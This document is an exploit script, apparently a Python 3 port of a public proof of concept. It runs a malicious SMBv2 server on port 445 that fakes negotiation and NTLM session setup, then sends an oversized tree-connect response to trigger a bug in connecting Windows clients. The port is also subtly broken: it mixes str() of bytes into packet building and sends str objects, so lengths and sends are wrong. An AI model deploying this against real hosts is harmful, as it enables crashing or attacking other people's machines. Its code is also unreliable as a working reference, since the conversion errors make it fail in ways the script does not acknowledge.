#!/usr/bin/env python3
# Full Proof of Concept: 
# https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/41222.zip
# Converted to Python 3 from original Python 2

import sys
import struct
import socketserver
from collections import OrderedDict
from datetime import datetime
from calendar import timegm

class Packet():
    fields = OrderedDict([
        ("data", ""),
    ])
    def __init__(self, **kw):
        self.fields = OrderedDict(self.__class__.fields)
        for k,v in kw.items():
            if callable(v):
                self.fields[k] = v(self.fields[k])
            else:
                self.fields[k] = v
    def __str__(self):
        return "".join(map(str, self.fields.values()))

def NTStamp(Time):
    NtStamp = 116444736000000000 + (timegm(Time.timetuple()) * 10000000)
    return struct.pack("Q", NtStamp + (Time.microsecond * 10))

def longueur(payload):
    length = struct.pack(">i", len(''.join(payload)))
    return length

def GrabMessageID(data):
    Messageid = data[28:36]
    return Messageid

def GrabCreditRequested(data):
    CreditsRequested = data[18:20]
    if CreditsRequested == b"\x00\x00":
       CreditsRequested =  b"\x01\x00"
    else:
       CreditsRequested = data[18:20]
    return CreditsRequested

def GrabCreditCharged(data):
    CreditCharged = data[10:12]
    return CreditCharged

def GrabSessionID(data):
    SessionID = data[44:52]
    return SessionID

class SMBv2Header(Packet):
    fields = OrderedDict([
        ("Proto",         b"\xfe\x53\x4d\x42"),
        ("Len",           b"\x40\x00"),
        ("CreditCharge",  b"\x00\x00"),
        ("NTStatus",      b"\x00\x00\x00\x00"),
        ("Cmd",           b"\x00\x00"),
        ("Credits",       b"\x01\x00"),
        ("Flags",         b"\x01\x00\x00\x00"),
        ("NextCmd",       b"\x00\x00\x00\x00"),
        ("MessageId",     b"\x00\x00\x00\x00\x00\x00\x00\x00"),
        ("PID",           b"\xff\xfe\x00\x00"),
        ("TID",           b"\x00\x00\x00\x00"),
        ("SessionID",     b"\x00\x00\x00\x00\x00\x00\x00\x00"),
        ("Signature",     b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"),
    ])

class SMB2NegoAns(Packet):
    fields = OrderedDict([
        ("Len",             b"\x41\x00"),
        ("Signing",         b"\x01\x00"),
        ("Dialect",         b"\xff\x02"),
        ("Reserved",        b"\x00\x00"),
        ("Guid",            b"\xea\x85\xab\xf1\xea\xf6\x0c\x4f\x92\x81\x92\x47\x6d\xeb\x72\xa9"),
        ("Capabilities",    b"\x07\x00\x00\x00"),
        ("MaxTransSize",    b"\x00\x00\x10\x00"),
        ("MaxReadSize",     b"\x00\x00\x10\x00"),
        ("MaxWriteSize",    b"\x00\x00\x10\x00"),
        ("SystemTime",      NTStamp(datetime.now())),
        ("BootTime",        b"\x22\xfb\x80\x01\x40\x09\xd2\x01"),
        ("SecBlobOffSet",   b"\x80\x00"),
        ("SecBlobLen",      b"\x78\x00"),
        ("Reserved2",       b"\x4d\x53\x53\x50"),
        ("InitContextTokenASNId",     b"\x60"),
        ("InitContextTokenASNLen",    b"\x76"),
        ("ThisMechASNId",   b"\x06"),
        ("ThisMechASNLen",  b"\x06"),
        ("ThisMechASNStr",  b"\x2b\x06\x01\x05\x05\x02"),
        ("SpNegoTokenASNId",          b"\xA0"),
        ("SpNegoTokenASNLen",         b"\x6c"),
        ("NegTokenASNId",             b"\x30"),
        ("NegTokenASNLen",            b"\x6a"),
        ("NegTokenTag0ASNId",         b"\xA0"),
        ("NegTokenTag0ASNLen",        b"\x3c"),
        ("NegThisMechASNId",          b"\x30"),
        ("NegThisMechASNLen",         b"\x3a"),
        ("NegThisMech1ASNId",         b"\x06"),
        ("NegThisMech1ASNLen",        b"\x0a"),
        ("NegThisMech1ASNStr",        b"\x2b\x06\x01\x04\x01\x82\x37\x02\x02\x1e"),
        ("NegThisMech2ASNId",         b"\x06"),
        ("NegThisMech2ASNLen",        b"\x09"),
        ("NegThisMech2ASNStr",        b"\x2a\x86\x48\x82\xf7\x12\x01\x02\x02"),
        ("NegThisMech3ASNId",         b"\x06"),
        ("NegThisMech3ASNLen",        b"\x09"),
        ("NegThisMech3ASNStr",        b"\x2a\x86\x48\x86\xf7\x12\x01\x02\x02"),
        ("NegThisMech4ASNId",         b"\x06"),
        ("NegThisMech4ASNLen",        b"\x0a"),
        ("NegThisMech4ASNStr",        b"\x2a\x86\x48\x86\xf7\x12\x01\x02\x02\x03"),
        ("NegThisMech5ASNId",         b"\x06"),
        ("NegThisMech5ASNLen",        b"\x0a"),
        ("NegThisMech5ASNStr",        b"\x2b\x06\x01\x04\x01\x82\x37\x02\x02\x0a"),
        ("NegTokenTag3ASNId",         b"\xA3"),
        ("NegTokenTag3ASNLen",        b"\x2a"),
        ("NegHintASNId",              b"\x30"),
        ("NegHintASNLen",             b"\x28"),
        ("NegHintTag0ASNId",          b"\xa0"),
        ("NegHintTag0ASNLen",         b"\x26"),
        ("NegHintFinalASNId",         b"\x1b"), 
        ("NegHintFinalASNLen",        b"\x24"),
        ("NegHintFinalASNStr",        b"Server2009@SMB3.local"),
        ("Data",                      b""),
    ])

    def calculate(self):
        StructLen = (str(self.fields["Len"])+str(self.fields["Signing"])+
                    str(self.fields["Dialect"])+str(self.fields["Reserved"])+
                    str(self.fields["Guid"])+str(self.fields["Capabilities"])+
                    str(self.fields["MaxTransSize"])+str(self.fields["MaxReadSize"])+
                    str(self.fields["MaxWriteSize"])+str(self.fields["SystemTime"])+
                    str(self.fields["BootTime"])+str(self.fields["SecBlobOffSet"])+
                    str(self.fields["SecBlobLen"])+str(self.fields["Reserved2"]))
        
        SecBlobLen = (str(self.fields["InitContextTokenASNId"])+str(self.fields["InitContextTokenASNLen"])+
                       str(self.fields["ThisMechASNId"])+str(self.fields["ThisMechASNLen"])+
                       str(self.fields["ThisMechASNStr"])+str(self.fields["SpNegoTokenASNId"])+
                       str(self.fields["SpNegoTokenASNLen"])+str(self.fields["NegTokenASNId"])+
                       str(self.fields["NegTokenASNLen"])+str(self.fields["NegTokenTag0ASNId"])+
                       str(self.fields["NegTokenTag0ASNLen"])+str(self.fields["NegThisMechASNId"])+
                       str(self.fields["NegThisMechASNLen"])+str(self.fields["NegThisMech1ASNId"])+
                       str(self.fields["NegThisMech1ASNLen"])+str(self.fields["NegThisMech1ASNStr"])+
                       str(self.fields["NegThisMech2ASNId"])+str(self.fields["NegThisMech2ASNLen"])+
                       str(self.fields["NegThisMech2ASNStr"])+str(self.fields["NegThisMech3ASNId"])+
                       str(self.fields["NegThisMech3ASNLen"])+str(self.fields["NegThisMech3ASNStr"])+
                       str(self.fields["NegThisMech4ASNId"])+str(self.fields["NegThisMech4ASNLen"])+
                       str(self.fields["NegThisMech4ASNStr"])+str(self.fields["NegThisMech5ASNId"])+
                       str(self.fields["NegThisMech5ASNLen"])+str(self.fields["NegThisMech5ASNStr"])+
                       str(self.fields["NegTokenTag3ASNId"])+str(self.fields["NegTokenTag3ASNLen"])+
                       str(self.fields["NegHintASNId"])+str(self.fields["NegHintASNLen"])+
                       str(self.fields["NegHintTag0ASNId"])+str(self.fields["NegHintTag0ASNLen"])+
                       str(self.fields["NegHintFinalASNId"])+str(self.fields["NegHintFinalASNLen"])+
                       str(self.fields["NegHintFinalASNStr"]))

        AsnLenStart = (str(self.fields["ThisMechASNId"])+str(self.fields["ThisMechASNLen"])+
                        str(self.fields["ThisMechASNStr"])+str(self.fields["SpNegoTokenASNId"])+
                        str(self.fields["SpNegoTokenASNLen"])+str(self.fields["NegTokenASNId"])+
                        str(self.fields["NegTokenASNLen"])+str(self.fields["NegTokenTag0ASNId"])+
                        str(self.fields["NegTokenTag0ASNLen"])+str(self.fields["NegThisMechASNId"])+
                        str(self.fields["NegThisMechASNLen"])+str(self.fields["NegThisMech1ASNId"])+
                        str(self.fields["NegThisMech1ASNLen"])+str(self.fields["NegThisMech1ASNStr"])+
                        str(self.fields["NegThisMech2ASNId"])+str(self.fields["NegThisMech2ASNLen"])+
                        str(self.fields["NegThisMech2ASNStr"])+str(self.fields["NegThisMech3ASNId"])+
                        str(self.fields["NegThisMech3ASNLen"])+str(self.fields["NegThisMech3ASNStr"])+
                        str(self.fields["NegThisMech4ASNId"])+str(self.fields["NegThisMech4ASNLen"])+
                        str(self.fields["NegThisMech4ASNStr"])+str(self.fields["NegThisMech5ASNId"])+
                        str(self.fields["NegThisMech5ASNLen"])+str(self.fields["NegThisMech5ASNStr"])+
                        str(self.fields["NegTokenTag3ASNId"])+str(self.fields["NegTokenTag3ASNLen"])+
                        str(self.fields["NegHintASNId"])+str(self.fields["NegHintASNLen"])+
                        str(self.fields["NegHintTag0ASNId"])+str(self.fields["NegHintTag0ASNLen"])+
                        str(self.fields["NegHintFinalASNId"])+str(self.fields["NegHintFinalASNLen"])+
                        str(self.fields["NegHintFinalASNStr"]))

        AsnLen2 = (str(self.fields["NegTokenASNId"])+str(self.fields["NegTokenASNLen"])+
                   str(self.fields["NegTokenTag0ASNId"])+str(self.fields["NegTokenTag0ASNLen"])+
                   str(self.fields["NegThisMechASNId"])+str(self.fields["NegThisMechASNLen"])+
                   str(self.fields["NegThisMech1ASNId"])+str(self.fields["NegThisMech1ASNLen"])+
                   str(self.fields["NegThisMech1ASNStr"])+str(self.fields["NegThisMech2ASNId"])+
                   str(self.fields["NegThisMech2ASNLen"])+str(self.fields["NegThisMech2ASNStr"])+
                   str(self.fields["NegThisMech3ASNId"])+str(self.fields["NegThisMech3ASNLen"])+
                   str(self.fields["NegThisMech3ASNStr"])+str(self.fields["NegThisMech4ASNId"])+
                   str(self.fields["NegThisMech4ASNLen"])+str(self.fields["NegThisMech4ASNStr"])+
                   str(self.fields["NegThisMech5ASNId"])+str(self.fields["NegThisMech5ASNLen"])+
                   str(self.fields["NegThisMech5ASNStr"])+str(self.fields["NegTokenTag3ASNId"])+
                   str(self.fields["NegTokenTag3ASNLen"])+str(self.fields["NegHintASNId"])+
                   str(self.fields["NegHintASNLen"])+str(self.fields["NegHintTag0ASNId"])+
                   str(self.fields["NegHintTag0ASNLen"])+str(self.fields["NegHintFinalASNId"])+
                   str(self.fields["NegHintFinalASNLen"])+str(self.fields["NegHintFinalASNStr"]))

        MechTypeLen = (str(self.fields["NegThisMechASNId"])+str(self.fields["NegThisMechASNLen"])+
                       str(self.fields["NegThisMech1ASNId"])+str(self.fields["NegThisMech1ASNLen"])+
                       str(self.fields["NegThisMech1ASNStr"])+str(self.fields["NegThisMech2ASNId"])+
                       str(self.fields["NegThisMech2ASNLen"])+str(self.fields["NegThisMech2ASNStr"])+
                       str(self.fields["NegThisMech3ASNId"])+str(self.fields["NegThisMech3ASNLen"])+
                       str(self.fields["NegThisMech3ASNStr"])+str(self.fields["NegThisMech4ASNId"])+
                       str(self.fields["NegThisMech4ASNLen"])+str(self.fields["NegThisMech4ASNStr"])+
                       str(self.fields["NegThisMech5ASNId"])+str(self.fields["NegThisMech5ASNLen"])+
                       str(self.fields["NegThisMech5ASNStr"]))

        # SEC Blob lengths
        self.fields["SecBlobOffSet"] = struct.pack("<h", len(StructLen)+64)
        self.fields["SecBlobLen"] = struct.pack("<h", len(SecBlobLen))
        
        # ASN Stuff
        self.fields["InitContextTokenASNLen"] = struct.pack("<B", len(SecBlobLen)-2)
        self.fields["ThisMechASNLen"] = struct.pack("<B", len(str(self.fields["ThisMechASNStr"])))
        self.fields["SpNegoTokenASNLen"] = struct.pack("<B", len(AsnLen2))
        self.fields["NegTokenASNLen"] = struct.pack("<B", len(AsnLen2)-2)
        self.fields["NegTokenTag0ASNLen"] = struct.pack("<B", len(MechTypeLen))
        self.fields["NegThisMech1ASNLen"] = struct.pack("<B", len(str(self.fields["NegThisMech1ASNStr"])))
        self.fields["NegThisMech2ASNLen"] = struct.pack("<B", len(str(self.fields["NegThisMech2ASNStr"])))
        self.fields["NegThisMech3ASNLen"] = struct.pack("<B", len(str(self.fields["NegThisMech3ASNStr"])))
        self.fields["NegThisMech4ASNLen"] = struct.pack("<B", len(str(self.fields["NegThisMech4ASNStr"])))
        self.fields["NegThisMech5ASNLen"] = struct.pack("<B", len(str(self.fields["NegThisMech5ASNStr"])))
        
        Tag3Len = (str(self.fields["NegHintASNId"])+str(self.fields["NegHintASNLen"])+
                   str(self.fields["NegHintTag0ASNId"])+str(self.fields["NegHintTag0ASNLen"])+
                   str(self.fields["NegHintFinalASNId"])+str(self.fields["NegHintFinalASNLen"])+
                   str(self.fields["NegHintFinalASNStr"]))
        
        self.fields["NegTokenTag3ASNLen"] = struct.pack("<B", len(Tag3Len))
        self.fields["NegHintASNLen"] = struct.pack("<B", len(Tag3Len)-2)
        self.fields["NegHintTag0ASNLen"] = struct.pack("<B", len(Tag3Len)-4)
        self.fields["NegHintFinalASNLen"] = struct.pack("<B", len(str(self.fields["NegHintFinalASNStr"])))

class SMB2Session1Data(Packet):
    fields = OrderedDict([
        ("Len",             b"\x09\x00"),
        ("SessionFlag",     b"\x01\x00"),
        ("SecBlobOffSet",   b"\x48\x00"),
        ("SecBlobLen",      b"\x06\x01"),
        ("ChoiceTagASNId",        b"\xa1"), 
        ("ChoiceTagASNLenOfLen",  b"\x82"), 
        ("ChoiceTagASNIdLen",     b"\x01\x02"),
        ("NegTokenTagASNId",      b"\x30"),
        ("NegTokenTagASNLenOfLen",b"\x81"),
        ("NegTokenTagASNIdLen",   b"\xff"),
        ("Tag0ASNId",             b"\xA0"),
        ("Tag0ASNIdLen",          b"\x03"),
        ("NegoStateASNId",        b"\x0A"),
        ("NegoStateASNLen",       b"\x01"),
        ("NegoStateASNValue",     b"\x01"),
        ("Tag1ASNId",             b"\xA1"),
        ("Tag1ASNIdLen",          b"\x0c"),
        ("Tag1ASNId2",            b"\x06"),
        ("Tag1ASNId2Len",         b"\x0A"),
        ("Tag1ASNId2Str",         b"\x2b\x06\x01\x04\x01\x82\x37\x02\x02\x0a"),
        ("Tag2ASNId",             b"\xA2"),
        ("Tag2ASNIdLenOfLen",     b"\x81"),
        ("Tag2ASNIdLen",          b"\xE9"),
        ("Tag3ASNId",             b"\x04"),
        ("Tag3ASNIdLenOfLen",     b"\x81"),
        ("Tag3ASNIdLen",          b"\xE6"),
        ("NTLMSSPSignature",      b"NTLMSSP"),
        ("NTLMSSPSignatureNull",  b"\x00"),
        ("NTLMSSPMessageType",    b"\x02\x00\x00\x00"),
        ("NTLMSSPNtWorkstationLen",b"\x1e\x00"),
        ("NTLMSSPNtWorkstationMaxLen",b"\x1e\x00"),
        ("NTLMSSPNtWorkstationBuffOffset",b"\x38\x00\x00\x00"),
        ("NTLMSSPNtNegotiateFlags",b"\x15\x82\x89\xe2"),
        ("NTLMSSPNtServerChallenge",b"\x82\x21\x32\x14\x51\x46\xe2\x83"),
        ("NTLMSSPNtReserved",      b"\x00\x00\x00\x00\x00\x00\x00\x00"),
        ("NTLMSSPNtTargetInfoLen",b"\x94\x00"),
        ("NTLMSSPNtTargetInfoMaxLen",b"\x94\x00"),
        ("NTLMSSPNtTargetInfoBuffOffset",b"\x56\x00\x00\x00"),
        ("NegTokenInitSeqMechMessageVersionHigh",b"\x06"),
        ("NegTokenInitSeqMechMessageVersionLow",b"\x03"),
        ("NegTokenInitSeqMechMessageVersionBuilt",b"\x80\x25"),
        ("NegTokenInitSeqMechMessageVersionReserved",b"\x00\x00\x00"),
        ("NegTokenInitSeqMechMessageVersionNTLMType",b"\x0f"),
        ("NTLMSSPNtWorkstationName",b"SMB3"),
        ("NTLMSSPNTLMChallengeAVPairsId",b"\x02\x00"),
        ("NTLMSSPNTLMChallengeAVPairsLen",b"\x0a\x00"),
        ("NTLMSSPNTLMChallengeAVPairsUnicodeStr",b"SMB5"),
        ("NTLMSSPNTLMChallengeAVPairs1Id",b"\x01\x00"),
        ("NTLMSSPNTLMChallengeAVPairs1Len",b"\x1e\x00"),
        ("NTLMSSPNTLMChallengeAVPairs1UnicodeStr",b"WIN-PRH502RQAFV"), 
        ("NTLMSSPNTLMChallengeAVPairs2Id",b"\x04\x00"),
        ("NTLMSSPNTLMChallengeAVPairs2Len",b"\x1e\x00"),
        ("NTLMSSPNTLMChallengeAVPairs2UnicodeStr",b"SMB5.local"), 
        ("NTLMSSPNTLMChallengeAVPairs3Id",b"\x03\x00"),
        ("NTLMSSPNTLMChallengeAVPairs3Len",b"\x1e\x00"),
        ("NTLMSSPNTLMChallengeAVPairs3UnicodeStr",b"WIN-PRH502RQAFV.SMB3.local"),
        ("NTLMSSPNTLMChallengeAVPairs5Id",b"\x05\x00"),
        ("NTLMSSPNTLMChallengeAVPairs5Len",b"\x04\x00"),
        ("NTLMSSPNTLMChallengeAVPairs5UnicodeStr",b"SMB5.local"),
        ("NTLMSSPNTLMChallengeAVPairs7Id",b"\x07\x00"),
        ("NTLMSSPNTLMChallengeAVPairs7Len",b"\x08\x00"),
        ("NTLMSSPNTLMChallengeAVPairs7UnicodeStr",NTStamp(datetime.now())),
        ("NTLMSSPNTLMChallengeAVPairs6Id",b"\x00\x00"),
        ("NTLMSSPNTLMChallengeAVPairs6Len",b"\x00\x00"),
    ])

    def calculate(self):
        # Workstation name and AV pairs are already bytes
        pass

class SMB2SessionAcceptData(Packet):
    fields = OrderedDict([
        ("Len",                       b"\x09\x00"),
        ("SessionFlag",               b"\x01\x00"),
        ("SecBlobOffSet",             b"\x48\x00"),
        ("SecBlobLen",                b"\x1d\x00"),
        ("SecBlobTag0",               b"\xa1"), 
        ("SecBlobTag0Len",            b"\x1b"),
        ("NegTokenResp",              b"\x30"), 
        ("NegTokenRespLen",           b"\x19"), 
        ("NegTokenRespTag0",          b"\xa0"),
        ("NegTokenRespTag0Len",       b"\x03"),
        ("NegStateResp",              b"\x0a"),
        ("NegTokenRespLen1",           b"\x01"),
        ("NegTokenRespStr",           b"\x00"),
        ("SecBlobTag3",               b"\xa3"), 
        ("SecBlobTag3Len",            b"\x12"),
        ("SecBlobOctetHeader",        b"\x04"),
        ("SecBlobOctetLen",           b"\x10"),
        ("MechlistMICVersion",        b""),
        ("MechlistCheckSum",          b""),
        ("MechlistSeqNumber",         b""),
        ("Data",                      b""),
    ])
    def calculate(self):
        # SecBlobLen Calc:
        CalculateSecBlob = (str(self.fields["SecBlobTag0"])+str(self.fields["SecBlobTag0Len"])+
                           str(self.fields["NegTokenResp"])+str(self.fields["NegTokenRespLen"])+
                           str(self.fields["NegTokenRespTag0"])+str(self.fields["NegTokenRespTag0Len"])+
                           str(self.fields["NegStateResp"])+str(self.fields["NegTokenRespLen1"])+
                           str(self.fields["NegTokenRespStr"])+str(self.fields["SecBlobTag3"])+
                           str(self.fields["SecBlobTag3Len"])+str(self.fields["SecBlobOctetHeader"])+
                           str(self.fields["SecBlobOctetLen"])+str(self.fields["MechlistMICVersion"])+
                           str(self.fields["MechlistCheckSum"])+str(self.fields["MechlistSeqNumber"]))

        CalculateASN = (str(self.fields["NegTokenResp"])+str(self.fields["NegTokenRespLen"])+
                       str(self.fields["NegTokenRespTag0"])+str(self.fields["NegTokenRespTag0Len"])+
                       str(self.fields["NegStateResp"])+str(self.fields["NegTokenRespLen1"])+
                       str(self.fields["NegTokenRespStr"])+str(self.fields["SecBlobTag3"])+
                       str(self.fields["SecBlobTag3Len"])+str(self.fields["SecBlobOctetHeader"])+
                       str(self.fields["SecBlobOctetLen"])+str(self.fields["MechlistMICVersion"])+
                       str(self.fields["MechlistCheckSum"])+str(self.fields["MechlistSeqNumber"]))

        MechLen = (str(self.fields["SecBlobOctetHeader"])+
                  str(self.fields["SecBlobOctetLen"])+
                  str(self.fields["MechlistMICVersion"])+
                  str(self.fields["MechlistCheckSum"])+
                  str(self.fields["MechlistSeqNumber"]))

        # Packet Struct len
        self.fields["SecBlobLen"] = struct.pack("<h", len(CalculateSecBlob))
        self.fields["SecBlobTag0Len"] = struct.pack("<B", len(CalculateASN))
        self.fields["NegTokenRespLen"] = struct.pack("<B", len(CalculateASN)-2)
        self.fields["SecBlobTag3Len"] = struct.pack("<B", len(MechLen))
        self.fields["SecBlobOctetLen"] = struct.pack("<B", len(MechLen)-2)

class SMB2TreeData(Packet):
    fields = OrderedDict([
        ("Len",                   b"\x10\x00"),
        ("ShareType",             b"\x02\x00"),
        ("ShareFlags",            b"\x30\x00\x00\x00"),
        ("ShareCapabilities",     b"\x00\x00\x00\x00"),
        ("AccessMask",            b"\xff\x01\x1f\x01"),   
        ("Data",                  b""),         
    ])

class SMB2(socketserver.BaseRequestHandler):
    
    def handle(self):
        try:
            self.request.settimeout(1)
            print("From:", self.client_address)
            data = self.request.recv(1024)

            # Negotiate proto answer.
            if data[8:10] == b"\x72\x00" and data[4:5] == b"\xfe":
                head = SMBv2Header(CreditCharge=b"\x00\x00", Credits=b"\x01\x00", PID=b"\x00\x00\x00\x00")
                t = SMB2NegoAns()
                t.calculate()
                packet1 = str(head)+str(t)
                buffer1 = longueur(packet1)+packet1  
                print("[*]Negotiating SMBv2.")
                self.request.send(buffer1)
                data = self.request.recv(1024)

            if data[16:18] == b"\x00\x00":
                CreditsRequested = data[18:20]
                if CreditsRequested == b"\x00\x00":
                    CreditsRequested = b"\x01\x00"
                CreditCharged = data[10:12]
                head = SMBv2Header(MessageId=GrabMessageID(data), PID=b"\xff\xfe\x00\x00", CreditCharge=GrabCreditCharged(data), Credits=GrabCreditRequested(data))
                t = SMB2NegoAns(Dialect=b"\x02\x02")
                t.calculate()
                packet1 = str(head)+str(t)
                buffer1 = longueur(packet1)+packet1  
                print("[*]Negotiate Protocol SMBv2 packet sent.")
                self.request.send(buffer1)
                data = self.request.recv(1024)

            # Session More Work to Do
            if data[16:18] == b"\x01\x00":
                head = SMBv2Header(Cmd=b"\x01\x00", MessageId=GrabMessageID(data), PID=b"\xff\xfe\x00\x00", CreditCharge=GrabCreditCharged(data), Credits=GrabCreditRequested(data), SessionID=b"\x4d\x00\x00\x00\x00\x04\x00\x00", NTStatus=b"\x16\x00\x00\xc0")
                t = SMB2Session1Data()
                t.calculate()
                packet1 = str(head)+str(t)
                buffer1 = longueur(packet1)+packet1
                print("[*]Session challenge SMBv2 packet sent.")
                self.request.send(buffer1)
                data = self.request.recv(1024)

            # Session Positive
            if data[16:18] == b"\x01\x00" and GrabMessageID(data)[0:1] == b"\x02":
                head = SMBv2Header(Cmd=b"\x01\x00", MessageId=GrabMessageID(data), PID=b"\xff\xfe\x00\x00", CreditCharge=GrabCreditCharged(data), Credits=GrabCreditRequested(data), NTStatus=b"\x00\x00\x00\x00", SessionID=GrabSessionID(data))
                t = SMB2SessionAcceptData()
                t.calculate()
                packet1 = str(head)+str(t)
                buffer1 = longueur(packet1)+packet1
                self.request.send(buffer1)
                data = self.request.recv(1024)

            # Tree Connect
            if data[16:18] == b"\x03\x00":
                head = SMBv2Header(Cmd=b"\x03\x00", MessageId=GrabMessageID(data), PID=b"\xff\xfe\x00\x00", TID=b"\x01\x00\x00\x00", CreditCharge=GrabCreditCharged(data), Credits=GrabCreditRequested(data), NTStatus=b"\x00\x00\x00\x00", SessionID=GrabSessionID(data))
                t = SMB2TreeData(Data=b"C"*1500)  # BUG
                packet1 = str(head)+str(t)
                buffer1 = longueur(packet1)+packet1
                print("[*]Triggering Bug; Tree Connect SMBv2 packet sent.")
                self.request.send(buffer1)
                data = self.request.recv(1024)

        except Exception as e:
            print("Disconnected from", self.client_address)

if __name__ == "__main__":
    socketserver.TCPServer.allow_reuse_address = 1
    launch = socketserver.TCPServer(('', 445), SMB2)
    launch.serve_forever()